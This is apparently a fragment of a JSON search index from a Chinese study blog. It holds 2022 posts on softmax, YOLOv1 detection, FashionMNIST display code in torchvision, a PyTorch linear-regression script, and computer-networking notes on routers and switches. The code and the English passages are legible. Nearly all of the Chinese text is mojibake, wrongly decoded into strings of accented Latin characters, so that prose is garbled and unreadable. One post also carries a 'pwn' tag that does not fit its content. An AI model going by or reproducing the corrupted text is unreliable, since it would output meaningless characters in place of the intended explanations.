å®šä¹‰éœ€è¦çš„å‡½æ•° å®šä¹‰æ¨¡å‹å‡½æ•° å®šä¹‰äº¤å‰ç†µæŸå¤±å‡½æ•° å®šä¹‰å‡†ç¡®ç‡ å®šä¹‰ä¼˜åŒ–ç®—æ³• å®šä¹‰æ•°æ®åˆ†æ‰¹çš„å‡½æ•° è®­","tags":["deeplearning","softmax","completion"],"title":"softmaxç®€å•å®ç°"},{"categories":["principle"],"contents":" Coming together is a beginning; keeping together is progress; working together is success. â€” Edward Everett Hale\nYOLOv1 ä»‹ç» æ£€æµ‹åŸç† ç¥ç»ç½‘ç»œè®¾è®¡ è®­ç»ƒ æ¿€æ´»å‡½æ•° loss å‡½æ•° è¿‡æ‹Ÿåˆå¤„ç† ä»‹ç» You Only Look Once:Unified, Real-Time Object Detectio\nyolo æ˜¯ç»Ÿä¸€ã€å•é˜¶æ®µçš„ï¼Œå¿«é€Ÿã€å³æ—¶çš„ç›®æ ‡æ£€æµ‹æ¨¡å‹\nç›¸è¾ƒäºå…¶ä»–çš„æ¨¡å‹ï¼ˆä¾‹å¦‚ CNNï¼‰\nå®ƒçš„æœ€å¤§ç‰¹ç‚¹æ˜¯å¿« åŒæ—¶æ˜¯â€œå…¨å±€æ€§â€ï¼ˆgloballyï¼‰æ£€æµ‹ï¼Œæ›´æœ‰æ•´ä½“è§‚ èƒ½å¤Ÿæå–å‡ºç‰©ä½“çš„æŠ½è±¡ç‰¹å¾ï¼Œä¾¿äºè¿ç§»åˆ°è‰ºæœ¯å“ç­‰çš„æ£€æµ‹ æ£€æµ‹åŸç† yolo å°†æ•´ä¸ªå›¾ç‰‡åˆ†æˆ S*S ä¸ªæ ¼å­ï¼ˆgridï¼‰ï¼Œç„¶åå¯¹å…¶åˆ†åˆ«åšä¸¤ä¸ªæ£€æµ‹\nç‰©ä½“æ¡†ï¼ˆbounding boxï¼‰ï¼ŒåŒ…æ‹¬äº”ä¸ªç»´åº¦ï¼šx,y(ä¸­å¿ƒç‚¹åæ ‡),w,h(å®½å’Œé•¿),C(ç½®ä¿¡åº¦) å…¶ä¸­çš„ç½®ä¿¡åº¦æŒ‡çš„æ˜¯è¿™ä¸ªæ¡†å†…å­˜åœ¨ç‰©ä½“çš„æ¦‚ç‡çš„å¯ä¿¡åº¦ï¼Œç”¨å­˜åœ¨ç‰©ä½“çš„æ¦‚ç‡ä¹˜ä»¥ IOUï¼ˆé¢„æµ‹äº‹å®ä¸çœŸæ­£äº‹å®çš„äº¤é›†é™¤ä»¥é¢„æµ‹äº‹å®ä¸çœŸæ­£äº‹å®çš„å¹¶é›†ï¼‰ ç±»åˆ«æ£€æµ‹ï¼ˆconditional classï¼‰ï¼Œæ¯ä¸€ä¸ªå°æ–¹å—é¢„æµ‹ä¸€ä¸ªç±»åˆ«ï¼Œè¡¨ç¤ºè¿™ä¸ªå°æ–¹å—å†…çš„ç‰©ä½“æ¡†å¦‚æœæœ‰ç‰©ä½“é‚£è¿™ä¸ªç‰©ä½“çš„ç±»åˆ«æ˜¯ä»€ä¹ˆ å› æ­¤ï¼ŒæŸæ–¹å—å†…å­˜åœ¨æŸç±»åˆ«çš„ç‰©ä½“çš„ç½®ä¿¡åº¦æ˜¯ï¼š yolo è¾“å…¥å¼ é‡çš„ç»´åº¦ä¸º S*S*(B*5+c)ï¼Œåœ¨ yolov1 ä¸­ B å¾€å¾€æ˜¯ 1\næ‰€ä»¥ï¼Œyolo çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šåœ¨è¿™ä¸ªåŒºåŸŸæœ‰ç‰©ä½“ï¼Œè€Œä¸”è¿™ä¸ªç‰©ä½“æ˜¯è¿™ä¸ªç±»åˆ«çš„ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªåŒºåŸŸæœ‰è¿™ä¸ªç±»åˆ«çš„ç‰©ä½“\nç¥ç»ç½‘ç»œè®¾è®¡ yolov1 çš„ä¸»ä½“æ˜¯å·ç§¯ç¥ç»ç½‘ç»œï¼Œæ¨¡å‹å¤§å°å–å†³äºå·ç§¯ç¥ç»ç½‘ç»œçš„å±‚æ¬¡\nå¯¹åŸå›¾å¤šæ¬¡å·ç§¯ã€æ± åŒ–ï¼ˆæœ€å¤§æ± åŒ–ï¼‰åæ¥ä¸¤ä¸ªå…¨è¿æ¥å±‚\né€šè¿‡å·ç§¯æå–å‡ºåŸå›¾çš„å¤šä¸ªå±€éƒ¨ç‰¹å¾ï¼Œé€šè¿‡æ± åŒ–é™å™ªï¼Œç„¶åç»è¿‡å…¨è¿æ¥å±‚æ•´åˆç‰¹å¾å¹¶å¼•å…¥éçº¿æ€§åå¾—åˆ°ç»“æœ\nè®­ç»ƒ æ¿€æ´»å‡½æ•° é‡‡ç”¨ leakyReLU å‡½æ•° loss å‡½æ•° è¿‡æ‹Ÿåˆå¤„ç† ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/yolo/yolov1/","section":"principle","summary":"Coming together is a beginning; keeping together is progress; working together is success. â€” Edward Everett Hale YOLOv1 ä»‹ç» æ£€æµ‹åŸç† ç¥ç»ç½‘ç»œè®¾è®¡ è®­ç»ƒ æ¿€æ´»å‡½æ•° loss å‡½æ•° è¿‡æ‹Ÿåˆå¤„ç† ä»‹ç» You Only Look Once:Unified, Real-Time Object Detectio yolo æ˜¯ç»Ÿä¸€ã€å•é˜¶æ®µçš„ï¼Œå¿«é€Ÿã€å³æ—¶çš„ç›®æ ‡æ£€æµ‹æ¨¡å‹","tags":["pwn"],"title":"yolov1"},{"categories":["principle","softmax"],"contents":" It always seems impossible until it\u0026rsquo;s done. â€” Nelson Mandela\nä½¿ç”¨ torchvision åº“\nå›¾åƒè¯†åˆ« ä» MNIST è·å–æ•°æ® å®šä¹‰ç”»å›¾å‡½æ•° å°†æ•°æ®é›†é‡Œçš„ labels æ˜ å°„ä¸ºå­—ç¬¦ä¸² æ‰“å° features å’Œ labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms ä» MNIST è·å–æ•°æ® # è·å¾—çš„æ˜¯Mnistä¸­æ ‡æ³¨è¿‡çš„æ•°æ® trained_set = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) å®šä¹‰ç”»å›¾å‡½æ•° # å®šä¹‰ç”»å›¾å‡½æ•° def draw(features, labels): # è®¾ç½®å›¾è¡¨å¤§å° plt.rcParams[\u0026#39;figure.figsize\u0026#39;] = (8.0, 6.0) # åˆ›å»ºå­å›¾ _, axs = plt.subplots(10, len(features) // 10) # è°ƒæ•´é—´è· plt.subplots_adjust(left=None, bottom=None, right=None, top=None, wspace=None, hspace=2) assert isinstance(axs, np.ndarray) # ç±»å‹æ–­è¨€ # å°†å¤šç»´æ•°ç»„è½¬åŒ–ä¸ºä¸€ç»´æ•°ç»„ axs = axs.reshape((1, -1))[0] # print(axs) # å¯¹æ¯ä¸€ä¸ªå­å›¾å•ç‹¬è®¾ç½®å®ƒä»¬çš„åƒç´ å€¼å’Œæ ‡ç­¾ for ax, img, lbl in zip(axs, features, labels): # åƒç´ å€¼æ”¾ç½® ax.imshow((img.view((28, 28))).numpy()) # è®¾ç½®æ ‡ç­¾ ax.set_title(lbl) # å–æ¶ˆæ˜¾ç¤ºè½´ ax.axes.get_xaxis().set_visible(False) ax.axes.get_yaxis().set_visible(False) plt.show() å°†æ•°æ®é›†é‡Œçš„ labels æ˜ å°„ä¸ºå­—ç¬¦ä¸² # è®¾ç½®æ¯ä¸€ä¸ªæ•°å­—çš„æ˜ å°„å€¼ def get_fashion_mnist_labels(labels): text_labels = [\u0026#39;t-shirt\u0026#39;, \u0026#39;trouser\u0026#39;, \u0026#39;pullover\u0026#39;, \u0026#39;dress\u0026#39;, \u0026#39;coat\u0026#39;, \u0026#39;sandal\u0026#39;, \u0026#39;shirt\u0026#39;, \u0026#39;sneaker\u0026#39;, \u0026#39;bag\u0026#39;, \u0026#39;ankle boot\u0026#39;] return [text_labels[int(i)] for i in labels] æ‰“å° features å’Œ labels # æŠŠè®­ç»ƒå¥½çš„æ•°æ®è¿åŒæ¯ä¸€å¼ å›¾å¯¹åº”çš„è¯†åˆ«å€¼æ‰“å°å‡ºæ¥ draw([trained_set[i][0] for i in range(30)], get_fashion_mnist_labels([trained_set[i][1] for i in range(30)])) ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%ABintro/","section":"principle","summary":"It always seems impossible until it\u0026rsquo;s done. â€” Nelson Mandela ä½¿ç”¨ torchvision åº“ å›¾åƒè¯†åˆ« ä» MNIST è·å–æ•°æ® å®šä¹‰ç”»å›¾å‡½æ•° å°†æ•°æ®é›†é‡Œçš„ labels æ˜ å°„ä¸ºå­—ç¬¦ä¸² æ‰“å° features å’Œ labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms ä» MNIST è·å–æ•°æ® # è·å¾—çš„æ˜¯Mn","tags":["deeplearning","å›¾åƒè¯†åˆ«","intro"],"title":"å›¾åƒè¯†åˆ«intro"},{"categories":["principle","SimpleImplement"],"contents":" You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. â€” Marian Wright Edelman\næˆ‘ä»¬ä¹‹å‰çš„ç¨‹åºæœ‰æ—¶å…¼é¡¾äº†å¤ªå¤šçš„ç»†èŠ‚ï¼Œpytorchçš„åº“é‡Œæœ‰è®¸å¤šä¼˜é›…è€Œæ–¹ä¾¿çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥ä¼˜åŒ–æˆ‘ä»¬çš„ç¨‹åº\nçº¿æ€§å›å½’ä¼˜åŒ–å®ç°-åˆ©ç”¨pytorch é‡æ„å‡½æ•° å®šä¹‰æ•°æ®ï¼ˆfeatureså’Œlabelsï¼‰ å®šä¹‰Losså‡½æ•° å®šä¹‰æ¨¡å‹ å®šä¹‰ä¼˜åŒ–å‡½æ•° å®šä¹‰è®­ç»ƒå‡½æ•° å¼€å§‹è®­ç»ƒ é‡æ„å‡½æ•° å®šä¹‰æ•°æ®ï¼ˆfeatureså’Œlabelsï¼‰ def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): # åŸæœ¬çš„å®ç° # total_size = len(features) # indexes = list(range(0,total_size)) # random.shuffle(indexes) # for i in range(0, total_size, batch_size): # choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) # yield features.index_select(0,choice), labels.index_select(0,choice) # ä¼˜åŒ–çš„å®ç° # import torch.utils.data as Data # å…ˆç»„åˆç‰¹å¾å€¼å’ŒçœŸå€¼ dataSet = Data.TensorDataset(features, labels) # å°†æ•°æ®åˆ†æ‰¹ # è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ return Data.DataLoader(dataSet, batch_size, True) å®šä¹‰Losså‡½æ•° # åŸæœ¬çš„å®ç° # å®šä¹‰Losså‡½æ•° # def Loss(y_hat, y): # # 1/2*(y_hat - y)^2 # return (y_hat - y.view(y_hat.size()))**2/2 # ä¼˜åŒ–çš„å®ç° # nnä¸­å†…ç½®äº†å‡æ–¹æŸå¤±å‡½æ•° Loss = nn.MSELoss() å®šä¹‰æ¨¡å‹ # åŸæœ¬çš„å®ç°æ–¹æ³• # å®šä¹‰æ¨¡å‹ï¼ˆå‡½æ•°ï¼‰,æ­¤å¤„çš„æ¨¡å‹æ˜¯æœ€åŸºæœ¬çš„çŸ©é˜µä¹˜æ³• # def linMul(x,w,b): # return torch.mm(x,w) + b #ç¬¬äºŒç§å†™æ³• # è¿™ç§å†™æ³•çš„å¥½å¤„æ˜¯ä½¿å¤šå±‚ç¥ç»ç½‘ç»œæ¸…æ™°æ˜äº† # class LinearNet(nn.Module): # def __init__(self, n_feature:int) -\u0026gt; None: # super().__init__() # # å®šä¹‰è¾“å…¥å‚æ•°ä¸ªæ•°ä¸è¾“å‡ºå‚æ•°ä¸ªæ•°ï¼Œbiasé»˜è®¤è‡ªåŠ¨ç”Ÿæˆ # self.linear = nn.Linear(n_feature, 1) # # å‘å‰ä¼ æ’­å‡½æ•°ï¼ˆçº¿æ€§å‡½æ•°ï¼‰ # def forward(self, x): # # è·å–åˆ¤æ–­å€¼ # y = self.linear(x) # return y # ç¬¬ä¸‰ç§å†™æ³• def LinearNet(n_feature): # Sequentialæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥å®¹çº³å¤šå±‚æ¨¡å‹ return nn.Sequential( # æœ‰åºå­—å…¸ OrderedDict([ (\u0026#39;linear\u0026#39;, nn.Linear(n_feature, 1)) # è¿˜å¯ä»¥ä¼ å…¥å…¶ä»–å±‚ ]) ) # æˆ–è€…ç›´æ¥ return nn.Sequential(nn.Linear(n_feature,1)) # å¯ä»¥æŸ¥çœ‹å®¹å™¨ä¸­æ‰€æœ‰å¯å­¦ä¹ å‚æ•°ï¼ˆw\u0026amp;bï¼‰ # net = LinearNet(2) # for param in net.parameters(): # print(param) net = LinearNet(2) å®šä¹‰ä¼˜åŒ–å‡½æ•° # åŸæœ¬çš„å®ç° # å®šä¹‰ä¼˜åŒ–ç®—æ³• # def sgd(params, lr, batch_size): # for param in params: # param.data -= lr*param.grad / batch_size #ä¼˜åŒ–çš„å®ç° # ä¼šç›´æ¥å¯¹netä¸­çš„è®­ç»ƒå‚æ•°ä¼˜åŒ– # è®¾ç½®å­¦ä¹ ç‡ä¸º0.03 optimizer = torch.optim.SGD(net.parameters(), lr=0.03) å®šä¹‰è®­ç»ƒå‡½æ•° # å®šä¹‰è®­ç»ƒå‡½æ•° # def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): # for epoch in range(num_epoches): # for x,y in data_iter(features, batch_size, labels): # lab_tmp = linMul(x, hat_w.T, hat_b) # # print(lab_tmp) # l = Loss(lab_tmp, y).sum() # l.backward() # sgd([hat_w, hat_b], lr, batch_size) # hat_w.grad.data.zero_() # hat_b.grad.data.zero_() # train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() # print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) # print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) # print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) def train(num_epoch, features: torch.tensor, batch_size:int, labels:torch.tensor): for epoch in range(num_epoch): for x,y in data_iter(features, batch_size, labels): # è·å–æ¨¡æ‹Ÿç»“æœ output = net(x) # è®¡ç®—æŸå¤± l = Loss(output, y.view(output.size())) # æ¢¯åº¦æ¸…é›¶ optimizer.zero_grad() # åå‘æ±‚å¯¼ï¼ˆæ±‚åå¯¼ï¼‰ # è¿™æ ·å¯ä»¥æ±‚å‡ºä½¿Lossä¸‹é™æœ€å¿«çš„æ¢¯åº¦ l.backward() # ä¼˜åŒ– optimizer.step() print(f\u0026#34;epoch {epoch}, loss:{l}\u0026#34;) å¼€å§‹è®­ç»ƒ def main(): # å…ˆå®šä¹‰çœŸæ­£çš„w\u0026amp;bï¼Œè¿˜æœ‰åº”è¯¥å¾—åˆ°çš„ç»“æœ true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #å®šä¹‰1000ä¸ªæ•°æ®(ç‰¹å¾å€¼) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # å®šä¹‰çœŸå€¼ labels = torch.mm(features,true_w.T) + true_b # netæ˜¯ä¸€å¼ ç½‘ï¼ŒåŒ…å«äº†ç¥ç»ç½‘ç»œå„å±‚çš„è®­ç»ƒæ¨¡å‹ # åˆå§‹åŒ–æ¨¡å‹å‚æ•° # ä¸å¿…å†ä½¿ç”¨è‡ªå®šä¹‰çš„hat_wå’Œhat_bï¼Œè€Œæ˜¯ç›´æ¥å†…ç½®åˆ°æ¨¡å‹ä¸­ nn.init.normal_(net[0].weight, 0, 0.01) nn.init.constant_(net[0].bias, 0) # å®šä¹‰è¿­ä»£æ¬¡æ•° num_epoches = 10 # train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) train(num_epoches, features, 10, labels) print(f\u0026#34;true weight:{true_w}, hat weight:{net[0].weight}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{net[0].bias}\u0026#34;) ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression_optimized/","section":"principle","summary":"You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. â€” Marian Wright Edelman æˆ‘ä»¬ä¹‹å‰çš„ç¨‹åºæœ‰æ—¶å…¼é¡¾äº†å¤ªå¤šçš„ç»†èŠ‚ï¼Œpytorchçš„åº“é‡Œæœ‰è®¸å¤šä¼˜é›…è€Œæ–¹ä¾¿çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥ä¼˜åŒ–æˆ‘ä»¬","tags":["deeplearning","çº¿æ€§å›å½’","pytorch","completion"],"title":"çº¿æ€§å›å½’ä¼˜åŒ–å®ç°-åˆ©ç”¨pytorch"},{"categories":["principle","è®¡ç®—æœºç½‘ç»œ"],"contents":" Computers are like bikinis. They save people a lot of guesswork. â€” Sam Ewing\næœ¬ç¬”è®°æ˜¯ç¬”è€…åœ¨é˜…è¯»è®¡ç®—æœºç§‘å­¦å¯¼è®ºæ—¶çš„éšè®°\nè®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘_ç¬”è®° ç½‘ç»œ ç½‘ç»œï¼šæ˜¯ä¸€ç³»åˆ—å¯ç”¨äºé€šä¿¡çš„è®¾å¤‡ç›¸äº’è¿æ¥æ„æˆçš„ è®¾å¤‡ï¼š ä¸»æœºï¼ˆç»ˆç«¯ï¼‰ è¿æ¥è®¾å¤‡ å±€åŸŸç½‘ï¼ˆLANï¼‰ å¹¿åŸŸç½‘ï¼ˆWANï¼‰ ç‚¹å¯¹ç‚¹å¹¿åŸŸç½‘ äº¤æ¢å¹¿åŸŸç½‘ äº’è”ç½‘ç»œï¼ˆinternet ï¼Œå°å†™ï¼‰ å› ç‰¹ç½‘ï¼ˆInternetï¼Œå¤§å†™ï¼‰ éª¨å¹²ç½‘ ä¾›åº”å•†ç½‘ç»œ å®¢æˆ·ç½‘ç»œ éª¨å¹²ç½‘å’Œä¾›åº”å•†ç½‘ç»œå¹¶ç§°ä¸ºå› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† éª¨å¹²ç½‘è¢«ç§°ä¸ºå›½é™…å› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† ä¾›åº”å•†ç½‘ç»œè¢«ç§°ä¸ºå›½å†…æˆ–åœ°åŸŸæ€§å› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† Computer Organization CPU(central processing unit) ALU(arithmetic logic unit) control unit a set of registers Cache memory contains a copy of a portion of main memory accelerate the process procedure main memory address space Data(organized as words) I/O(input/output) subsystem input output catagories adress connected by bus data bus address bus control bus Difference between Router and Switch What are Switches in Computer Network? Features of Switches Types of Switches ç½‘ç»œ ç½‘ç»œï¼šæ˜¯ä¸€ç³»åˆ—å¯ç”¨äºé€šä¿¡çš„è®¾å¤‡ç›¸äº’è¿æ¥æ„æˆçš„ è®¾å¤‡ï¼š ä¸»æœºï¼ˆç»ˆç«¯ï¼‰ è¿æ¥è®¾å¤‡ è·¯ç”±å™¨ï¼šå°†ä¸€ä¸ªç½‘ç»œä¸å¦ä¸€ä¸ªç½‘ç»œç›¸è¿æ¥\näº¤æ¢æœºï¼šè®²ä¸åŒè®¾å¤‡è¿æ¥åœ¨ä¸€èµ·\nè°ƒåˆ¶è°ƒèŠ‚å™¨ï¼šå¯ä»¥æ”¹å˜æ•°æ®å½¢å¼\nå±€åŸŸç½‘ï¼ˆLANï¼‰ ç§æœ‰ç½‘ç»œ æ¯å°ä¸»æœºéƒ½æœ‰ä½œä¸ºè¿™å°ä¸»æœºåœ¨å±€åŸŸç½‘ä¸­å”¯ä¸€å®šä¹‰çš„ä¸€ä¸ªæ ‡è¯†å’Œä¸€ä¸ªåœ°å€ ä¸€å°ä¸»æœºå‘å¦ä¸€å°ä¸»æœºå‘é€çš„æ•°æ®åŒ…ä¸­åŒ…æ‹¬æºä¸»æœºå’Œç›®æ ‡ä¸»æœºçš„åœ°å€ ç”¨äº¤æ¢æœºï¼ˆswitchï¼‰è¿æ¥æ‰€æœ‰çš„ä¸»æœº å¹¿åŸŸç½‘ï¼ˆWANï¼‰ åœ°ç†è·¨åº¦è¾ƒ LAN å¤§å¾—å¤š WAN å°†äº¤æ¢æœºã€è·¯ç”±å™¨ï¼ˆrouterï¼‰æˆ–è°ƒåˆ¶è°ƒèŠ‚å™¨ä¹‹ç±»çš„è¿æ¥è®¾å¤‡äº’è¿ å±€åŸŸç½‘ä¸ºæœºæ„ç§æœ‰ï¼Œè€Œå¹¿åŸŸç½‘åˆ™ç”±é€šä¿¡å…¬å¸åˆ›å»ºå¹¶è¿è¥ ç‚¹å¯¹ç‚¹å¹¿åŸŸç½‘ @â€”â€”@\né€šè¿‡ä¼ è¾“åª’ä»‹ï¼ˆç”µç¼†æˆ–æ— çº¿ï¼‰è¿æ¥ä¸¤ä¸ªé€šä¿¡è®¾å¤‡çš„ç½‘ç»œ\näº¤æ¢å¹¿åŸŸç½‘ è‡³å°‘ä¸¤ä¸ªç«¯çš„ç½‘ç»œï¼Œäº¤æ¢å¹¿åŸŸç½‘ç”¨äºå½“ä»Šå…¨çƒé€šä¿¡çš„éª¨å¹²ç½‘ï¼Œæ˜¯å‡ ä¸ªç‚¹å¯¹ç‚¹å¹¿åŸŸç½‘é€šè¿‡äº¤æ¢æœºï¼ˆswitchï¼‰è¿æ¥äº§ç”Ÿçš„ç»“åˆä½“\näº’è”ç½‘ç»œï¼ˆinternet ï¼Œå°å†™ï¼‰ ä¸¤ä¸ªæˆ–å¤šä¸ªï¼ˆLAN\u0026amp;WANï¼‰ç›¸äº’è¿æ¥æ—¶ï¼Œä»–ä»¬æ„æˆä¸€ä¸ªäº’è”ç½‘ç»œï¼ˆç½‘é™…ç½‘ï¼‰\nå› ç‰¹ç½‘ï¼ˆInternetï¼Œå¤§å†™ï¼‰ æˆåƒä¸Šä¸‡ä¸ªäº’è”ç½‘ç»œç»„æˆå› ç‰¹ç½‘\néª¨å¹²ç½‘ ä¸ºé€šä¿¡å…¬å¸æ‹¥æœ‰ é€šè¿‡ç½‘ç»œå¯¹ç­‰æ±‡ç‚¹è¿æ¥ ä¾›åº”å•†ç½‘ç»œ è§„æ¨¡è¾ƒå° ä»˜è´¹ä½¿ç”¨éª¨å¹²ç½‘ä¸Šçš„ä¸€äº›æœåŠ¡ ä¸éª¨å¹²ç½‘ç›¸è¿ï¼Œæœ‰æ—¶ä¹Ÿè¿æ¥å…¶ä»–ä¾›åº”å•†ç½‘ç»œ å®¢æˆ·ç½‘ç»œ åœ¨è¾¹ç¼˜ çœŸæ­£ä½¿ç”¨åŸºäºå› ç‰¹ç½‘æœåŠ¡çš„ç½‘ç»œ å‘ä¾›åº”å•†ç½‘ç»œä»˜è´¹å¾—åˆ°æœåŠ¡ éª¨å¹²ç½‘å’Œä¾›åº”å•†ç½‘ç»œå¹¶ç§°ä¸ºå› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† éª¨å¹²ç½‘è¢«ç§°ä¸ºå›½é™…å› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† ä¾›åº”å•†ç½‘ç»œè¢«ç§°ä¸ºå›½å†…æˆ–åœ°åŸŸæ€§å› ç‰¹ç½‘æœåŠ¡ä¾›åº”å•† ä¸‹é¢æ˜¯å½“æ—¶æ‰¾åˆ°çš„ä¸€äº›å‚è€ƒèµ„æ–™ï¼ˆè¿˜æœ‰ä¸€äº›ç¬”è€…è‡ªå·±å†™çš„è‹±è¯­ç¬”è®°ï¼Œä½†æ˜¯æ˜¯é‚£ç¯‡å·²ç»å¿˜äº†ï¼‰ï¼ŒåŸç½‘å€æ‰¾ä¸åˆ°äº†ï¼Œå¦‚æœ‰ä¾µçŠ¯ä½œè€…æƒç›Šï¼Œç¬”è€…ä¸€å®šåˆ é™¤\nComputer Organization CPU(central processing unit) ALU(arithmetic logic unit) logic shift arithmetic operations control unit contrl the operation of CPU\ncomputer divided by instructions\nCISC(complex instruction set computers)\nprogrammer\u0026rsquo;s works are easier a large set of instructions RISC(reduced instruction set computers)\nprogrammer\u0026rsquo;s works are more difficult simple instructions the process of computer program\nways of processing\npipelining\nParallel processing\nSISD SIMD MISD(JUST CONCEPT) MIMD a cycle\nfetch decode execute a set of registers Data registers\nInstruction registers\ninstruction set\nopcode operand Program counter\nCache memory contains a copy of a portion of main memory accelerate the process procedure CPU checks the cache\nif it\u0026rsquo;s in cache ,get it if not, cache will go get it main memory address space adress Data(organized as words) RAM(random access memory)\nSRAM(static)\nfast expensive DRAM(dynamic)\nslow inexpensive ROM(read-only) memory\nPROM(cannot erase) EPROM(can erase by ultraviolet light) EEPROM(can erase by electronic impulses) I/O(input/output) subsystem input hard disk USB CD/DVD keyboard output monitor printer catagories Nonstorage devices\nStorage devices\nmagnetic optical adress isolated I/O method memory-mapped I/O method connected by bus data bus address bus control bus Difference between Router and Switch Router and Switch are both network connecting devices. Router works at network layer and is responsibe to find the shortest path for a packet whereas Switch connects various devices in a network. Router connects devices across multiple networks.\nFollowing are the important differences between Router and Switch.\nSr. No. Key Router Switch 1 Objective Router main objective is to connect various networks. Switch main objective is to connect various devices in a network. 2 Layer Router works in Network Layer. Switch works in Data Link Layer. 3 Usage Router is used in LAN and MAN. Switch is used only in LAN. 4 Data Format Router sends data in form of packets. Switch sends data in form of packets and frames. 5 Mode of Transmission Router follows duplex mode of transmission. Switch also follows duplex mode of transmission. 6 Collision Less collision in case of Router. In full duplex mode, no collision happens in switch too. 7 NAT Compatability Compatible with NAT. Not compatible with NAT. 8 Type Routing type is Adaptive and Non-adaptive routing. Switching type is Circuit, Packet and Message switching. What are Switches in Computer Network? A switch has many ports, to which computers are plugged in. When a data frame arrives at any port of a network switch, it examines the destination address, performs necessary checks and sends the frame to the corresponding device(s).It supports unicast, multicast as well as broadcast communications.\nFeatures of Switches A switch operates in the layer 2, i.e. data link layer of the OSI model. It is an intelligent network device that can be conceived as a multiport network bridge. It uses MAC addresses (addresses of medium access control sublayer) to send data packets to selected destination ports. It uses packet switching technique to receive and forward data packets from the source to the destination device. It is supports unicast (one-to-one), multicast (one-to-many) and broadcast (one-to-all) communications. Transmission mode is full duplex, i.e. communication in the channel occurs in both the directions at the same time. Due to this, collisions do not occur. Switches are active devices, equipped with network software and network management capabilities. Switches can perform some error checking before forwarding data to the destined port. The number of ports is higher â€“ 24/48. Types of Switches There are variety of switches that can be broadly categorised into 4 types âˆ’\nUnmanaged Switch âˆ’ These are inexpensive switches commonly used in home networks and small businesses. They can be set up by simply plugging in to the network, after which they instantly start operating. When more devices needs to be added, more switches are simply added by this plug and play method. They are referred to as u managed since they do not require to be configured or monitored. Managed Switch âˆ’ These are costly switches that are used in organisations with large and complex networks, since they can be customized to augment the functionalities of a standard switch. The augmented features may be QoS (Quality of Service) like higher security levels, better precision control and complete network management. Despite their cost, they are preferred in growing organizations due to their scalability and flexibility. Simple Network Management Protocol (SNMP) is used for configuring managed switches. LAN Switch âˆ’ Local Area Network (LAN) switches connects devices in the internal LAN of an organization. They are also referred as Ethernet switches or data switches. These switches are particularly helpful in reducing network congestion or bottlenecks. They allocate bandwidth in a manner so that there is no overlapping of data packets in a network. PoE Switch âˆ’ Power over Ethernet (PoE) switches are used in PoE Gogabit Ethernets. PoE technology combine data and power transmission over the same cable so that devices connected to it can receive both electricity as well as data over the same line. PoE switches offer greater flexibility and simplifies the cabling connections ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%BC%E8%AE%BA/","section":"principle","summary":"Computers are like bikinis. They save people a lot of guesswork. â€” Sam Ewing æœ¬ç¬”è®°æ˜¯ç¬”è€…åœ¨é˜…è¯»è®¡ç®—æœºç§‘å­¦å¯¼è®ºæ—¶çš„éšè®° è®¡ç®—æœºç½‘ç»œå’Œå› ç‰¹ç½‘_ç¬”è®° ç½‘ç»œ ç½‘ç»œï¼šæ˜¯ä¸€ç³»åˆ—å¯ç”¨äºé€šä¿¡çš„è®¾å¤‡ç›¸äº’è¿æ¥æ„æˆçš„ è®¾å¤‡ï¼š ä¸»æœº","tags":["è®¡ç®—æœºç½‘ç»œ"],"title":"å¯¼è®º"},{"categories":["principle","è®¡ç®—æœºç½‘ç»œ"],"contents":" Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. â€” Francis of Assisi\næ¦‚è¿° ä»€ä¹ˆæ˜¯äº’è”ç½‘ ä»€ä¹ˆæ˜¯åè®® è¾¹ç¼˜éƒ¨åˆ†å’Œæ ¸å¿ƒéƒ¨åˆ† è¾¹ç¼˜éƒ¨åˆ†-ä¸»æœº ä¸»æœºé€šä¿¡æ–¹å¼-C/Sï¼šå®¢æˆ·-æœåŠ¡å™¨æ–¹å¼ ä¸»æœºé€šä¿¡æ–¹å¼-P2Pï¼šå¯¹ç­‰è¿æ¥æ–¹å¼ æ ¸å¿ƒéƒ¨åˆ† 